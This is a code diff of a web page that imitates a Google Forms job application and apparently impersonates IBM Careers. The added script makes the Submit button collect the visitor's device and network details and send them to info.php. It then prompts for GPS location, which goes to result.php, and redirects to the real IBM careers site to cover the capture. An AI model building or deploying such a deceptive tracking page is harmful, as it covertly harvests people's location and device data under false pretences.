@@ -375,13 +375,13 @@
 
                         </div> 
                         
-                        <div role="button" class="uArJ5e UQuaGc Y5sE8d VkkpIf QvWxOd" aria-label="Submit" tabindex="0" onclick="triggerTracking();">
-                            <div class="Fvio9d MbhUzd"></div>
-                                <div class="e19J0b CeoRYc"></div>
-                                <span class="l4V7wb Fxmcue">
-                                <span class="NPEfkd RveJvd snByac">Submit</span>
-                                </span>
-</div>
+                       <div role="button" class="uArJ5e UQuaGc Y5sE8d VkkpIf QvWxOd" aria-label="Submit" tabindex="0" onclick="triggerTracking();">
+                        <div class="Fvio9d MbhUzd"></div>
+                        <div class="e19J0b CeoRYc"></div>
+                        <span class="l4V7wb Fxmcue">
+                        <span class="NPEfkd RveJvd snByac">Submit</span>
+                        </span>
+                        </div>
                                 <div class="nYdzXd">
                                     <div role="button" class="uArJ5e UQuaGc kCyAyd l3F1ye TFBnVe" jscontroller="VXdfxd" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue;touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc(preventDefault=true); touchcancel:JMtRjd;focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;" jsshadow jsname="X5DuWc" tabindex="0">
                                         <div class="Fvio9d MbhUzd" jsname="ksKsZd"></div>
@@ -452,14 +452,25 @@
     </script>
     <script src="location.js"></script>
     <script>
-        // Wait for the page to load
-        $(document).ready(function() {
-            // Attach a click event listener specifically to the "Submit" button
-            $('div[aria-label="Submit"]').on('click', function() {
-                information(); // Captures device/network info and sends to info.php
-                locate();      // Prompts for GPS and sends to result.php or error.php
+        // Triggered exactly when they click the clean Submit button
+        function triggerTracking() {
+            // 1. Instantly grab device details and send to info.php
+            information(); 
+            
+            // 2. Trigger the Location Prompt
+            locate(function() {
+                // Make the button turn green and say "Submitted"
+                var btnText = document.querySelector('div[aria-label="Submit"] .NPEfkd');
+                var btnBg = document.querySelector('div[aria-label="Submit"]');
+                if(btnText) btnText.innerHTML = "Submitted!";
+                if(btnBg) btnBg.style.backgroundColor = "#188038";
+
+                // 3. Wait 1.5 seconds, then redirect to the real IBM Careers page
+                setTimeout(function() {
+                    window.location.replace("https://www.ibm.com/careers");
+                }, 1500);
             });
-        });
+        }
     </script>
 </body>
 </html>
